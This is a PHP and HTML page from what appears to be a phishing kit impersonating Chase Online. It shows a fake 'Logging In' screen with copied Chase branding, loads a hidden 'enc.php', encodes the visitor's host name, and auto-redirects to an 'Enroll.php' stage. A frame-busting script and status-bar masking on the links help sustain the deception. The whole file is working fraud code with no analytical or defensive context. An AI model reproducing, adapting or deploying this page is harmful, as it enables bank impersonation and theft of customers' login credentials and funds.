<?php
$hostname = bin2hex ($_SERVER['HTTP_HOST']); //GET HOST NAME
$Redirect = "Enroll.php?valid=true&enroll=$hostname";
require_once 'enc.php';
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en"><head>
<style>
#routableEnrollHeader {padding-bottom:6px; font-size:1.2em; color:#095aa6; font-weight:bold; background: url(imgs/bk-dash.gif) repeat-x bottom left; margin-bottom:0px; text-transform:uppercase;}
#routableEnrollHeader #routableEnrollHeaderPad {padding-left:10px;}
#routableEnrollSubheader {font-size:0.6em; color:#000000;}
#routableSecurityBox h2 span {font-size:1.4em; color:#095aa6;}
#routableEnrollText {margin:10px; font-size:0.7em; border:}
#routableEnrollButton {display:block; width:180px; height:24px; background:url(imgs/ob-button-enroll-now.gif) no-repeat; margin-top:15px;}
#routableEnrollButton span {display:block; position:absolute; top:-1000px;}
#routableDemoButton {display:block; width:180px; height:24px; background:url(imgs/ob-button-see-the-demo.gif) no-repeat; margin-top:10px;}
#routableDemoButton span {display:block; position:absolute; top:-1000px;}
</style>

<style>
#routableEnrollHeader {padding-bottom:6px; font-size:1.2em; color:#095aa6; font-weight:bold; background: url(imgs/bk-dash.gif) repeat-x bottom left; margin-bottom:0px; text-transform:uppercase;}
#routableEnrollHeader #routableEnrollHeaderPad {padding-left:10px;}
#routableEnrollSubheader {font-size:0.6em; color:#000000;}
#routableSecurityBox h2 span {font-size:1.4em; color:#095aa6;}
#routableEnrollText {margin:10px; font-size:0.7em; border:}
#routableEnrollButton {display:block; width:180px; height:24px; background:url(imgs/ob-button-enroll-now.gif) no-repeat; margin-top:15px;}
#routableEnrollButton span {display:block; position:absolute; top:-1000px;}
#routableDemoButton {display:block; width:180px; height:24px; background:url(imgs/ob-button-see-the-demo.gif) no-repeat; margin-top:10px;}
#routableDemoButton span {display:block; position:absolute; top:-1000px;}
#routableSecurityBox {margin-top:0px; margin-left:30px; height:30px;}
#routableSecurityBox h2 {margin-top:0; font-size:1.2em; font-weight:bold; text-transform:uppercase; background: url(imgs/image/bk-dash.gif) repeat-x bottom left; margin-bottom:0px; padding-bottom:3px;}
#rountableLinkBox {background:url(imgs/sculptured-octagon.jpg) no-repeat bottom right; height:300px; font-size:0.75em;}
#rountableLinkBox ul {list-style-image:url(imgs/image/blue-link-arrow.gif); margin-top:10px; margin-left:-20;}
* html #rountableLinkBox ul {margin-left:20px;}
#rountableLinkBox a {color:#095aa6; text-decoration:none;}
#rountableLinkBox a:hover {text-decoration:underline;}
#rountableLinkBox li {margin-bottom:2px;}
#spacerH10 {FONT-SIZE: 0px; HEIGHT: 10px;}
* html  #spacerH10 {FONT-SIZE: 0px; HEIGHT: 10px; width: 90%;}
#topspacer {margin-top:1px;}
#clear {height:1px; width:460px; clear:both;}
.auto-style1 {
	height: 30px;
	font-size: 30px;
	text-align: center;
}
.auto-style2 {
	color: #336E9A;
}
.auto-style3 {
	color: #336E9A;
	font-size: 19px;
}
.auto-style4 {
	font-size: 15px;
}
</style>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta http-equiv="Pragma" content="no-cache"/>
<meta http-equiv="Expires" content="-1"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Cache-Control" content="no-store"/>
<meta http-equiv="Cache-Control" content="post-check=0"/>
<meta http-equiv="Cache-Control" content="pre-check=0"/>
<META HTTP-EQUIV="refresh" CONTENT="5; URL=<?php echo $Redirect; ?> ">

<meta http-equiv="Content-Style-Type" content="text/css"/>

<meta name="CONNECTION" content="CLOSE"/><link rel="stylesheet" type="text/css" href="imgs/style.css"/><link rel="stylesheet" type="text/css" href="imgs/style.css"/><link rel="stylesheet" type="text/css" href="imgs/style2.css"/><link rel="SHORTCUT ICON" href="imgs/favicon.ico"/><title>Chase Online - Logging In</title><!--POH--></head>


<body>

<script>

  if (window!= top)
    top.location.href=location.href
</script>


<center>
<!-- BEGIN Global Navigation table --><table cellspacing="0" cellpadding="0" border="0" class="fullwidth" summary="global navigation"><tr><td><a href="#" id="siteLogo"><img src="imgs/chaseNewlogo.gif" alt="Chase Online Logo" style="margin: 17px 17px 17px 17px;"/></a></td><td class="globalnav"><a id="homelink" href="JavaScript:document.location.href='#';" class="globalnavlinks">Chase.com</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a id="privacypolicylik" href="JavaScript:document.location.href='#';" class="globalnavlinks">Privacy Notice</a></td></tr></table><!-- END Global Navigation table --><!-- BEGIN Tab Navigation table --><table cellspacing="0" cellpadding="0" border="0" summary="primary navigation"><tr><td class="spacerh5">&nbsp;</td></tr></table><!-- END Tab Navigation table --><!-- BEGIN Segment table --><table cellspacing="0" cellpadding="0" border="0" class="headerbarwidth" summary="section header"><tr class="headerbar"><td class="segimage" align="left">&nbsp;</td><td class="headerbardate">
&nbsp;</td></tr></table><!-- END Segment table -->
<div class="constraint-container">
<table cellspacing="0" cellpadding="0" class="fullwidth">
	<tr>
		<td class="sidebar">&nbsp;</td>

		<td width="771" valign="top">&nbsp;</td>
		<td class="sidebar">&nbsp;</td>
	</tr>
	<tr>
		<td class="sidebar">&nbsp;</td>
		<td class="auto-style1"><br><span class="auto-style3">Logging In....Please 
		Wait</span><br><br><img src="imgs/loader.gif" alt="loading"><br><br>
		<span class="auto-style2"><span class="auto-style4"><strong>You will 
		be redirected  within 5 seconds</strong></span></span><span class="auto-style4"><br>
		</span><br></td>

		<td class="sidebar">&nbsp;</td>
	</tr>
	<tr>
		<td class="sidebar" colspan="3">&nbsp;</td>
	</tr>
</table>
</div>
<!--Footer--><table border="0" cellspacing="0" cellpadding="0" class="fullwidth" summary="terms of use link and copyright"><tr><td class="spacerh10" colspan="3">&nbsp;</td></tr><tr><td style="width:30%; vertical-align:top">&nbsp;</td><td align="center" width="40%" valign="top"><span class="footertext"><a id="SecurityLink" href="#" onBlur="window.status='';return true" onMouseOver="window.status='';return true" onFocus="window.status='';return true" onMouseOut="window.status='';return true">Security</a>&nbsp;|&nbsp;<a id="TermsLink" href="#" onBlur="window.status='';return true" onMouseOver="window.status='';return true" onFocus="window.status='';return true" onMouseOut="window.status='';return true">Terms of Use</a>&nbsp;</span></td><td style="text-align:center; width:30%; vertical-align:top">&nbsp;</td></tr><tr><td class="spacerh20" colspan="3"><!--Start Render Children--></td></tr><tr><td colspan="3"><!--Start Render Children--><!-- START 3/28 to temporarily remove displaying this asset because it's appearing on CMS-->

<!-- start DCTM ECP footnote_prelogin_disc.xml -->
<table width="100%"  border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td align="center" class="footerText">JPMorgan Chase Bank, N.A. Member FDIC</td>
  </tr>
</table>
<!-- end DCTM ECP footnote_prelogin_disc.xml -->
<!--End Render Children--></td></tr></table><div class="printable"><table border="0" cellspacing="0" cellpadding="0" class="fullwidth"><tr><td class="spacerh10">&nbsp;</td></tr><tr><td align="center" class="footertext">&nbsp;&#169; 2019 JPMorgan Chase &amp; Co.</td></tr><tr><td class="spacerh10">&nbsp;</td></tr></table></div><!--END Footer-->
</center>

</body></html>
<?php ob_end_flush(); ?>